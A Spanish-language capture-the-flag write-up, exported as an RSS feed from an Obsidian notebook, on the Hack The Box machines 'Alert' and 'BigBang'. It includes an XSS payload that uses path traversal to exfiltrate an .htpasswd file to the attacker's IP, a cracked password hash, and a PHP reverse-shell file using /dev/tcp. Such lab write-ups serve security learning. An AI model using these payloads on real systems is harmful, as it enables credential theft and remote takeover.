<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[HTB]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>HTB</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Mon, 24 Feb 2025 15:49:47 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Mon, 24 Feb 2025 15:49:08 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[00-index]]></title><description><![CDATA[ 
 <br>This is the structure of the machine folder<br><br><a data-tooltip-position="top" aria-label="Machines/Alert/0-0.md" data-href="Machines/Alert/0-0.md" href="machines/alert/0-0.html" class="internal-link" target="_self" rel="noopener nofollow">0-0</a><br><a data-tooltip-position="top" aria-label="Machines/Alert/00-index.md" data-href="Machines/Alert/00-index.md" href="machines/alert/00-index.html" class="internal-link" target="_self" rel="noopener nofollow">00-index</a><br><a data-tooltip-position="top" aria-label="Machines/Alert/01-recon.md" data-href="Machines/Alert/01-recon.md" href="machines/alert/01-recon.html" class="internal-link" target="_self" rel="noopener nofollow">01-recon</a><br><a data-tooltip-position="top" aria-label="Machines/Alert/02-exploitation.md" data-href="Machines/Alert/02-exploitation.md" href="machines/alert/02-exploitation.html" class="internal-link" target="_self" rel="noopener nofollow">02-exploitation</a><br><a data-tooltip-position="top" aria-label="Machines/Alert/03-post-exploitation.md" data-href="Machines/Alert/03-post-exploitation.md" href="machines/alert/03-post-exploitation.html" class="internal-link" target="_self" rel="noopener nofollow">03-post-exploitation</a><br><a data-tooltip-position="top" aria-label="Machines/Alert/Alert.md" data-href="Machines/Alert/Alert.md" href="machines/alert/alert.html" class="internal-link" target="_self" rel="noopener nofollow">Alert</a><br><br><br><br>
<br>Text
<br>Text
<br><br>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a>
<br>...
]]></description><link>machines/alert/00-index.html</link><guid isPermaLink="false">Machines/Alert/00-index.md</guid><pubDate>Wed, 27 Nov 2024 00:27:04 GMT</pubDate></item><item><title><![CDATA[01-recon]]></title><description><![CDATA[ 
 <br>{TPC SynScan}<br>sudo nmap -sS --min-rate 5000 -Pn -n -vvv alert.htb -oN reconsS.txt 
[sudo] contraseña para kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 16:19 CET
Initiating SYN Stealth Scan at 16:19
Scanning alert.htb (10.10.11.44) [1000 ports]
Discovered open port 80/tcp on 10.10.11.44
Discovered open port 22/tcp on 10.10.11.44
Completed SYN Stealth Scan at 16:19, 0.25s elapsed (1000 total ports)
Nmap scan report for alert.htb (10.10.11.44)
Host is up, received user-set (0.037s latency).
Scanned at 2024-11-26 16:19:50 CET for 0s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
           Raw packets sent: 1000 (44.000KB) | Rcvd: 1000 (40.008KB)

<br>{TCP SCV}<br> sudo nmap -sCV --min-rate 5000 -Pn -n -vvv alert.htb  -p 22,80 -oN reconsCV.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 16:20 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Initiating SYN Stealth Scan at 16:20
Scanning alert.htb (10.10.11.44) [2 ports]
Discovered open port 22/tcp on 10.10.11.44
Discovered open port 80/tcp on 10.10.11.44
Completed SYN Stealth Scan at 16:20, 0.06s elapsed (2 total ports)
Initiating Service scan at 16:20
Scanning 2 services on alert.htb (10.10.11.44)
Completed Service scan at 16:20, 6.17s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.44.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 1.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.15s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Nmap scan report for alert.htb (10.10.11.44)
Host is up, received user-set (0.037s latency).
Scanned at 2024-11-26 16:20:42 CET for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSrBVJEKTgtUohrzoK9i67CgzqLAxnhEsPmW8hS5CFFGYikUduAcNkKsmmgQI09Q+6pa+7YHsnxcerBnW0taI//IYB5TI/LSE3yUxyk/ROkKLXPNiNGUhC6QiCj3ZTvThyHrFD9ZTxWfZKEQTcOiPs15+HRPCZepPouRtREGwmJcvDal1ix8p/2/C8X57ekouEEpIk1wzDTG5AM2/D08gXXe0TP+KYEaZEzAKM/mQUAqNTxfjc9x5rlfPYW+50kTDwtyKta57tBkkRCnnns0YRnPNtt0AH374ZkYLcqpzxwN8iTNXaeVT/dGfF4mA1uW89hSMarmiRgRh20Y1KIaInHjv9YcvSlbWz+2sz3ev725d4IExQTvDR4sfUAdysIX/q1iNpleyRgM4cvDMjxD6lEKpvQYSWVlRoJwbUUnJqnmZXboRwzRl+V3XCUaABJrA/1K1gvJfsPcU5LX303CV6LDwvLJIcgXlEbtjhkcxz7b7CS78BEW9hPifCUDGKfUs=
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHYLF+puo27gFRX69GBeZJqCeHN3ps2BScsUhKoDV66yEPMOo/Sn588F/wqBnJxsPB3KSFH+kbYW2M6erFI3U5k=
|   256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/QUl3gapBOWCGEHplsOKe2NlWjlrb5vTTLjg6gMuGl
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Alert - Markdown Viewer
|_Requested resource was index.php?page=alert
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)

<br><br><br><br><br><br><br><br>wfuzz --sc 400,200,300 -w /usr/share/wordlists/wfuzz/general/common.txt http://alert.htb/FUZZ.php 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://alert.htb/FUZZ.php
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000203:   200        1 L      3 W        24 Ch       "contact"                                                                                                  
000000521:   200        1 L      0 W        1 Ch        "messages"                                                                                                 

Total time: 0
Processed Requests: 951
Filtered Requests: 949
Requests/sec.: 0


<br><br>“Pasted image 20241126162421.png” could not be found.<br><br><img alt="Pasted image 20241126162252.png" src="machines/alert/images/pasted-image-20241126162252.png"><br><br><br>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;link rel="stylesheet" href="[css/style.css](view-source:http://alert.htb/css/style.css)"&gt;
    &lt;title&gt;Alert - Markdown Viewer&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;nav&gt;
        &lt;a href="[index.php?page=alert](view-source:http://alert.htb/index.php?page=alert)"&gt;Markdown Viewer&lt;/a&gt;
        &lt;a href="[index.php?page=contact](view-source:http://alert.htb/index.php?page=contact)"&gt;Contact Us&lt;/a&gt;
        &lt;a href="[index.php?page=about](view-source:http://alert.htb/index.php?page=about)"&gt;About Us&lt;/a&gt;
        &lt;a href="[index.php?page=donate](view-source:http://alert.htb/index.php?page=donate)"&gt;Donate&lt;/a&gt;
            &lt;/nav&gt;
    &lt;div class="container"&gt;
        &lt;h1&gt;Markdown Viewer&lt;/h1&gt;&lt;div class="form-container"&gt;
            &lt;form action="[visualizer.php](view-source:http://alert.htb/visualizer.php)" method="post" enctype="multipart/form-data"&gt;
                &lt;input type="file" name="file" accept=".md" required&gt;
                &lt;input type="submit" value="View Markdown"&gt;
            &lt;/form&gt;
          &lt;/div&gt;    &lt;/div&gt;
    &lt;footer&gt;
        &lt;p style="color: black;"&gt;© 2024 Alert. All rights reserved.&lt;/p&gt;
    &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;
<br><br>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Alert - Markdown Viewer&lt;/title&gt;
    &lt;link rel="stylesheet" href="[css/style.css](view-source:http://alert.htb/css/style.css)"&gt;
    &lt;style&gt;
        .share-button {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: rgb(100, 100, 100);
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    Please upload a Markdown file.&lt;/body&gt;
&lt;/html&gt;
<br>Intentamos subir un archivo markdown ..<br>
“Pasted image 20241126163005.png” could not be found.<br>Vamos  a intentar un XSS en el archivo markdown, para ello:<br>&lt;!-- XSS with regular tags --&gt;
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1) /&gt;
<br>“Pasted image 20241126165646.png” could not be found.<br>El servidor es vulnerable a XSS<br><br><br>
<br>statistics.alert.htb
]]></description><link>machines/alert/01-recon.html</link><guid isPermaLink="false">Machines/Alert/01-recon.md</guid><pubDate>Wed, 27 Nov 2024 01:47:39 GMT</pubDate><enclosure url="machines/alert/images/pasted-image-20241126162252.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/alert/images/pasted-image-20241126162252.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[02-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br>XSS(over markdown)
<br>Phishing 
<br><br>Una vez localizado el xss probamos un exploit en el archivo de markdown <br>&lt;script&gt;  
fetch("http://alert.htb/messages.php?file=filepath")  
  .then(response =&gt; response.text())  
  .then(data =&gt; {  
    fetch("http://10.10.15.43:2323/?file_content=" + encodeURIComponent(data));  
  });  
&lt;/script&gt;
<br>El script hace lo siguiente:<br>
<br>Obtiene el contenido de  la carpeta "messages" que devolvia un 403 Forbidden  (http://alert.htb/messages.php?file=filepath).
<br>Luego, toma ese contenido y lo reenvía como parámetro  a nuestro servidor en el puerto 2323 (http://10.10.15.43:2323/)
<br>python3 -m http.server 2323   
Serving HTTP on 0.0.0.0 port 2323 (http://0.0.0.0:2323/) ...
<br>Recibimos respuesta de nosotros mismos:<br>10.10.15.43 - - [29/Nov/2024 01:07:23] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:07:30] "GET /?file_content=%0A HTTP/1.1" 200 -
<br><br>Podemos darle a boton de "share markdown" y nos devuelve un link que vamos a mandale al admin en "contact"<br>
(<a rel="noopener nofollow" class="external-link" href="http://alert.htb/index.php?page=contact" target="_blank">http://alert.htb/index.php?page=contact</a>)<br>
<img alt="Pasted image 20241129010955.png" src="machines/alert/pasted-image-20241129010955.png"><br>
Nos devuelve conexion !<br>10.10.11.44 - - [29/Nov/2024 01:10:56] "GET /?file_content=%3Cpre%3E%3C%2Fpre%3E%0A HTTP/1.1" 200 -
<br>Ahora sabemos que le podemos hacer un phishing al admin<br>Modificamos el script para sacar informacion<br><br>Vamos a buscar el .htpassword del subdominio statistics que vimos en el recon para sacar un hash<br>&lt;script&gt;  
fetch("http://alert.htb/messages.php?file=./../../../../../../var/www/statistics.alert.htb/.htpasswd")  
  .then(response =&gt; response.text())  
  .then(data =&gt; {  
    fetch("http://10.10.15.43:2323/?file_content=" + encodeURIComponent(data));  
  });  
&lt;/script&gt;

<br>El archivo .htpasswd es utilizado en servidores web Apache para almacenar las credenciales de usuario y sus contraseñas, de modo que los usuarios puedan autenticarse cuando acceden a ciertas áreas del sitio protegido por autenticación básica. Este archivo se encuentra generalmente en el servidor (usualmente en un directorio fuera del acceso público) y contiene una lista de usuarios con sus contraseñas cifradas.<br>
Serving HTTP on 0.0.0.0 port 2323 (http://0.0.0.0:2323/) ...
10.10.15.43 - - [29/Nov/2024 01:24:05] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:24:06] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:24:12] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:24:14] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.11.44 - - [29/Nov/2024 01:24:19] "GET /?file_content=%3Cpre%3E%3C%2Fpre%3E%0A HTTP/1.1" 200 -
<br>10.10.15.43 - - [29/Nov/2024 01:21:21] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:21:24] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.11.44 - - [29/Nov/2024 01:21:30] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -

<br>El texto codificado en URL %3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A<br>
puede ser decodificado de la siguiente manera:<br>%3C corresponde a &lt;
%3E corresponde a &gt;
%24 corresponde a $
%2F corresponde a /
%0A corresponde a un salto de línea (nueva línea)
<br>Al decodificarlo, obtenemos el siguiente texto:<br>&lt;pre&gt;albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/&lt;/pre&gt;
<br>Parece que tenemos un hash en md5 de apache<br>$john -w=/usr/share/wordlists/rockyou.txt -format=md5crypt-long  hash
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (alber)     
1g 0:00:00:00 DONE (2024-11-29 01:30) 6.250g/s 17600p/s 17600c/s 17600C/s bebito..medicina
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
<br>Ahora podemos conectarnos por ssh como usuario : Albert<br><br><br>albert@alert:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -        
<br>Tenemos un jugoso 8080 donde vamos a mener el foucino <br>ssh albert@alert.htb -L 8080:localhost:8080
<br><img alt="Pasted image 20241129022709.png" src="machines/alert/pasted-image-20241129022709.png"><br><a rel="noopener nofollow" class="external-link" href="https://github.com/neatnik/website-monitor" target="_blank">https://github.com/neatnik/website-monitor</a><br>Dentro de la documentacion del github para monitor:<br>"Upload everything to your web server (except the screen.png file, which isn’t needed). Make sure that PHP has permission to write to the monitors directory (this is where monitor data is stored)."<br>vamos a buscar la carpeta monitors al sistema ya que php se comunica con la carpeta <br>find / -type d -name "monitor" 2&gt;/dev/null

### Respuesta
find / -type d -name "*monitor*" 2&gt;/dev/null
/var/lib/systemd/deb-systemd-helper-enabled/mdmonitor.service.wants
/opt/website-monitor
/opt/website-monitor/monitors
/sys/kernel/slab/:A-0000192/cgroup/cred_jar(637:website-monitor.service)
/sys/kernel/slab/hugetlbfs_inode_cache/cgroup/hugetlbfs_inode_cache(637:website-monitor.service)
/sys/kernel/slab/:A-0001344/cgroup/UDPv6(637:website-monitor.service)
/sys/kernel/slab/sock_inode_cache/cgroup/sock_inode_cache(637:website-monitor.service)
/sys/kernel/slab/kmalloc-64/cgroup/kmalloc-64(637:website-monitor.service)
/sys/kernel/slab/radix_tree_node/cgroup/radix_tree_node(107:lvm2-monitor.service)
/sys/kernel/slab/radix_tree_node/cgroup/radix_tree_node(637:website-monitor.service)
/sys/kernel/slab/dentry/cgroup/dentry(637:website-monitor.service)
/sys/kernel/slab/dentry/cgroup/dentry(107:lvm2-monitor.service)
/sys/kernel/slab/:A-0000064/cgroup/anon_vma_chain(637:website-monitor.service)
/sys/kernel/slab/anon_vma/cgroup/anon_vma(637:website-monitor.service)
/sys/kernel/slab/:a-0000104/cgroup/buffer_head(107:lvm2-monitor.service)
/sys/kernel/slab/:a-0000104/cgroup/buffer_head(637:website-monitor.service)
/sys/kernel/slab/mm_struct/cgroup/mm_struct(637:website-monitor.service)
/sys/kernel/slab/inode_cache/cgroup/inode_cache(637:website-monito

....
<br>La carpeta website-monitors parece promising vamos a echarle un vistazo<br>albert@alert:/opt/website-monitor$ ls -la .
total 96
drwxrwxr-x 7 root root        4096 Oct 12 01:07 .
drwxr-xr-x 4 root root        4096 Oct 12 00:58 ..
drwxrwxr-x 2 root management  4096 Oct 12 04:17 config
drwxrwxr-x 8 root root        4096 Oct 12 00:58 .git
drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents
-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php
-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE
-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php
drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors
-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json
-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php
-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md
-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css
drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates

<br>Con permiso de escritura en la carpeta config creamos un archivo reverse.php<br>&lt;?php exec("/bin/bash -c 'bash -i &gt;/dev/tcp/10.10.15.43/4444 0&gt;&amp;1'"); ?&gt;
<br>ahora realizo una peticion web al archivo localhost:8080/config/reverse.php<br><img alt="Pasted image 20241129025934.png" src="machines/alert/pasted-image-20241129025934.png"><br><br>
<br>local 8080 open port 127.0.0.1:8080
<br><br>
<br>
<br>]]></description><link>machines/alert/02-exploitation.html</link><guid isPermaLink="false">Machines/Alert/02-exploitation.md</guid><pubDate>Fri, 29 Nov 2024 01:59:54 GMT</pubDate><enclosure url="machines/alert/pasted-image-20241129010955.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/alert/pasted-image-20241129010955.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[03-post-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br>
<br><br>
<br>
<br>]]></description><link>machines/alert/03-post-exploitation.html</link><guid isPermaLink="false">Machines/Alert/03-post-exploitation.md</guid><pubDate>Wed, 27 Nov 2024 00:27:03 GMT</pubDate></item><item><title><![CDATA[Alert]]></title><description><![CDATA[<a class="tag" href="?query=tag:machine" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#machine</a> 
 <br><br><br> <img src="https://www.hackthebox.com//storage/avatars/6f4647030d6aadc676b8d8a459de344f.png" referrerpolicy="no-referrer"> <br><a href=".?query=tag:machine" class="tag" target="_blank" rel="noopener nofollow">#machine</a><br><br><img src="lib/media/linux.png" style="max-width:70px" referrerpolicy="no-referrer"><br><br><br>
id:: 636
active:: True
name:: Alert
os::Linux
user_flag:: True
root_flag:: True
difficulty_text:: Easy
stars:: 4.3
created:: 01/25/2025
published:: 11/23/24
avatar:: /storage/avatars/6f4647030d6aadc676b8d8a459de344f.png
tags:: 
<br><br><br><br><br>Update this Machine info]]></description><link>machines/alert/alert.html</link><guid isPermaLink="false">Machines/Alert/Alert.md</guid><pubDate>Sat, 25 Jan 2025 18:07:24 GMT</pubDate><enclosure url="https://www.hackthebox.com//storage/avatars/6f4647030d6aadc676b8d8a459de344f.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.hackthebox.com//storage/avatars/6f4647030d6aadc676b8d8a459de344f.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[01-Recon]]></title><description><![CDATA[ 
 <br><br>Al entrar en el puerto 80 se redirige automaticamente al subdominio <a rel="noopener nofollow" class="external-link" href="http://blog.bigbang.htb/" target="_blank">http://blog.bigbang.htb/</a> por lo que lo guardamos en el '/etc/hosts'<br>echo "10.10.11.52 blog.bigbang.htb" &gt;&gt; /etc/hosts
<br>En el puerto 80 nos encontramos un blog de wordpress:<br>➜  BigBang wappalyzer -i http://blog.bigbang.htb
http://blog.bigbang.htb Apache HTTP Server v2.4.62, Debian, PHP v8.3.2, WordPress v6.5.4, Backbone.js v1.5.0, Clipboard.js, jQuery v3.7.1, jQuery Migrate v3.4.1, TinyMCE v4, Underscore.js v1.13.4, core-js v3.35.1, Dropzone v5.7.0, jQuery UI v1.13.2, Lodash v1.13.6, MediaElement.js v4.2.17, mOxie, Select2, Twitter Emoji (Twemoji), RSS
<br><img alt="Pasted image 20250131121917.png" src="machines/bigbang/imgs/pasted-image-20250131121917.png"><br><br>Vamos a fuzzear el wordpress para encontrar archivos accesibles interesantes:<br>➜  BigBang find /usr/share/seclists/ -type f -iname 'wordpress*'

/usr/share/seclists/Passwords/Honeypot-Captures/wordpress-attacks-july2014.txt
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress.txt
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress-all-levels.txt
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
➜  BigBang feroxbuster -u http://blog.bigbang.htb -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt

200      GET      182l      398w     3834c http://blog.bigbang.htb/wp-admin/css/color-picker.css
200      GET      384l     3177w    19915c http://blog.bigbang.htb/license.txt
200      GET        1l        1w        2c http://blog.bigbang.htb/wp-admin/admin-footer.php
200      GET        2l     1375w    58586c http://blog.bigbang.htb/wp-admin/css/customize-controls-rtl.min.css
200      GET      397l      781w     6223c http://blog.bigbang.htb/wp-admin/css/install-rtl.css
200      GET      396l      775w     6190c http://blog.bigbang.htb/wp-admin/css/install.css
200      GET      479l     1182w    12597c http://blog.bigbang.htb/wp-admin/css/customize-widgets-rtl.css
200      GET     2037l     3990w    37699c http://blog.bigbang.htb/wp-admin/css/edit.css
200      GET       16l       36w      490c http://blog.bigbang.htb/wp-admin/css/wp-admin-rtl.css
200      GET       16l       36w      490c http://blog.bigbang.htb/wp-admin/css/wp-tables.min.css

etc...
<br>Para una busqueda mas detallada del wordpress podemos usar <a data-tooltip-position="top" aria-label="https://wpscan.com/" rel="noopener nofollow" class="external-link" href="https://wpscan.com/" target="_blank">WpScan</a> que es una herramienta que nos permite buscar vulnerabilidades de wordpress<br>[+] URL: http://blog.bigbang.htb/ [10.10.11.52]
[+] Started: Fri Jan 31 13:23:49 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.62 (Debian)
 |  - X-Powered-By: PHP/8.3.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.bigbang.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.bigbang.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.bigbang.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.bigbang.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=6.5.4&lt;/generator&gt;
 |  - http://blog.bigbang.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=6.5.4&lt;/generator&gt;

[+] WordPress theme in use: twentytwentyfour
 | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] buddyforms
 | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 | Last Updated: 2025-01-30T02:58:00.000Z
 | [!] The version is out of date, the latest version is 2.8.15
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.7.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 &lt;===============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jan 31 13:24:01 2025
[+] Requests Done: 171
[+] Cached Requests: 5
[+] Data Sent: 44.029 KB
[+] Data Received: 778.725 KB
[+] Memory used: 296.125 MB
[+] Elapsed time: 00:00:12
➜  BigBang 


<br>Segun el Recon tenemos diferentes vectores de ataque:<br>Vectores:<br>
1.Wordpress V 6.5.4 (insecure)<br>
La version de wordpress esta desactualizada.<br>
<a data-tooltip-position="top" aria-label="https://www.tenable.com/plugins/was/114353" rel="noopener nofollow" class="external-link" href="https://www.tenable.com/plugins/was/114353" target="_blank">Info</a><br>
2.XML-RPC Habilitado<br>
Con ello podemos:<br>
Brute-forcing credenciales usando el xmlrpc.php endpoint.<br>
Amplificar los DoS.<br>
Ataques de Pingback (denial of service)<br>
3. Pluggin buddyforms desactualizado<br>
